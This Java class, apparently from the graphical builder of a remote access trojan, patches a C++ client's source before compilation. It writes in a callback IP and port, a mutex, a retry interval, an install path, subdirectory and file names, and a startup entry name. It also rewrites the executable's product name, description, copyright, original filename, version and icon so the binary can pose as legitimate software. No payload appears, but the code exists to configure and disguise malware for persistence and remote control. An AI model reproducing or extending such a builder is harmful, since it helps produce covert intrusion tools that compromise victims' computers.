package GUI.Compiler;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;


public class CPPModifier {

    private final File fileToBeModified;
    private String fileContent;

    public CPPModifier(String location) {
        this.fileToBeModified = new File(location);
        fileContent = dumpFileContent(fileToBeModified);
    }

    private String dumpFileContent(File fileToBeModified) {
        StringBuilder oldContent = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(fileToBeModified))) {
            String line = reader.readLine();
            while (line != null) {
                oldContent.append(line).append(System.lineSeparator());
                line = reader.readLine();
            }
            return oldContent.toString();
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    public void setIP(String IP) {
        String startPoint = "#define IP \"";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\"", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), IP);
    }


    public void setPORT(String PORT) {
        String startPoint = "#define PORT ";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\n", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), PORT);
    }

    public void setTagName(String tagName) {
        String startPoint = "#define TAG_NAME \"";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\"", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), tagName);
    }

    public void setMutex(String mutex) {
        String startPoint = "#define MUTEX \"";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\"", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), mutex);
    }

    public void setTimingRetry(String time) {
        String startPoint = "#define TIMING_RETRY ";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\n", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), time);
    }

    public void setInstallationPath(String path) {
        String startPoint = "#define INSTALL_PATH ";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\n", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), path);
    }

    public void setSubdirectoryName(String subdirectoryName) {
        String startPoint = "#define SUBDIRECTORY_NAME \"";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\"", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), subdirectoryName);
    }

    public void setSubdirectoryFileName(String subdirectoryFileName) {
        String startPoint = "#define SUBDIRECTORY_FILE_NAME \"";
        int start = fileContent.indexOf(startPoint) + startPoint.length();
        int end = fileContent.indexOf("\"", start);
        fileContent = fileContent.replace(fileContent.substring(start, end), subdirectoryFileName);
    }

    public void setStartUpName(String definitionName, String nameToInsert) {
        fileContent = fileContent.replaceAll("#define " + definitionName + " ((\".*\")|(.+))", "#define " + definitionName + " " + nameToInsert);
    }

    public void writeToFile() {
        try (FileWriter writer = new FileWriter(fileToBeModified)) {
            writer.write(fileContent);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    //  Include directive to file "includeTarget" -> name of directive to be added
    public void addInclude(String includeTarget) {
        String commentedInclude = "//" + includeTarget;
        if (fileContent.contains(commentedInclude)) {
            fileContent = fileContent.replace(commentedInclude, includeTarget);
        }
    }

    //  Include directive to file "includeTarget" -> name of directive to be removed
    public void removeInclude(String includeTarget) {
        String commentedInclude = "//" + includeTarget;
        if (!fileContent.contains(commentedInclude)) {
            fileContent = fileContent.replace(includeTarget, commentedInclude);
        }
    }

    public void modifyAssemblySettings(String fileDescription, String fileVersion, String productName,
                                       String copyright, String originalName, String iconPath) {

        fileContent = fileContent.replaceAll("VALUE \"ProductVersion\",\"(.)*\"", "VALUE \"ProductVersion\",\"" + fileVersion + "\"");
        fileVersion = fileVersion.replaceAll("\\.", ",");
        fileContent = fileContent.replaceAll("FILEVERSION (\\d,){3}\\d|FILEVERSION (\\d,){2}\\d|FILEVERSION \\d,\\d|FILEVERSION \\d", "FILEVERSION " + fileVersion);
        fileContent = fileContent.replaceAll("PRODUCTVERSION (\\d,){3}\\d|PRODUCTVERSION (\\d,){2}\\d|PRODUCTVERSION \\d,\\d|PRODUCTVERSION \\d", "PRODUCTVERSION " + fileVersion);
        fileContent = fileContent.replaceAll("VALUE \"FileDescription\",\"(.)*\"", "VALUE \"FileDescription\",\"" + fileDescription + "\"");
        fileContent = fileContent.replaceAll("VALUE \"ProductName\",\"(.)*\"", "VALUE \"ProductName\",\"" + productName + "\"");
        fileContent = fileContent.replaceAll("VALUE \"LegalCopyright\",\"(.)*\"", "VALUE \"LegalCopyright\",\"" + copyright + "\"");
        fileContent = fileContent.replaceAll("VALUE \"OriginalFilename\",\"(.)*\"", "VALUE \"OriginalFilename\",\"" + originalName + "\"");
        if (!iconPath.isEmpty()) {
            iconPath = iconPath.replaceAll("\\\\", "/");
            fileContent = fileContent.replaceAll("(//)?AppIconID ICON \".*\"", "AppIconID ICON \"" + iconPath + "\"");
        } else if (!fileContent.contains("//AppIconID ICON"))
            fileContent = fileContent.replace("AppIconID ICON", "//AppIconID ICON");
    }


}

